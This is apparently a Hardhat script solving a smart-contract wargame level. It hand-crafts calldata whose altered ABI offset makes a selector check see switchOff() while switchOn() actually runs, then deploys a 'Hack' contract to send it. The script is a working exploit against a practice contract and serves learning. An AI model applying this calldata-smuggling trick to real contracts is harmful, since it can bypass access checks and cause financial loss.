// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");
require("dotenv").config();
async function main() {

  //!You can use simple Wallet to do this challenge or use contract and send calldata via a function
  //? Both approach implemented below...

/* const goerli_account="0x49d214291B14373292A66c4dfa4d8E25A99f9a88"
  const wallet=new hre.ethers.Wallet(process.env.PRIVATE_KEY_SEPOLIA)
  const provider=hre.ethers.getDefaultProvider(process.env.ALCHEMY_SEPOLIA_URL)
  const connectedWallet=wallet.connect(provider)
  const recipient = goerli_account
  const amount = ethers.utils.parseEther("1");
const transaction={
  to:recipient,
  value:amount,
}
const bytes=hre.ethers.utils.toUtf8Bytes("flipSwitch(bytes)")
const fSwitch=hre.ethers.utils.keccak256(bytes).substring(0,10) */
//const tx=  await connectedWallet.sendTransaction(transaction)

              //!flipSwitch function selectors keccak256 hashed value taken 4 byte 
const callData="0x30c13ade"+
              //! offset value hardcoded-- this value tells us where the data value starts, decimal 96
"0000000000000000000000000000000000000000000000000000000000000060"+
              //!extra 32 byte 
"0000000000000000000000000000000000000000000000000000000000000000"+
              //!function selector of switchOff()
"20606e1500000000000000000000000000000000000000000000000000000000"+
              //!this part tells us the size of data we give as argument - 4 byte
"0000000000000000000000000000000000000000000000000000000000000004"+
              //!function selector of switchOn() -> This location is 96 and our offset value points to this position
"76227e1200000000000000000000000000000000000000000000000000000000"


/*  console.log("Wallet address",wallet.address)
 console.log("Tx response:",tx)
 console.log("Flipswitch encoded",fSwitch) */
const Hack=await hre.ethers.getContractFactory("Hack")
const hack=await Hack.deploy()
const tx = await hack.deployed()
console.log("Deploy Tx;",tx)

await hack.hack(callData)

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});


 //TODO: SlotCheck contract's slot 0x0:
                   /*      0x  00000              --> padding into 32 bytes
                            6f05b59d3b20000    --> struct.amount  
                            01                 --> struct.isApproved
                            0c                 --> struct.id
                            92e5c70dd41824a0617e07271a7e1e81a9bce064 --> struct.receiver */
                            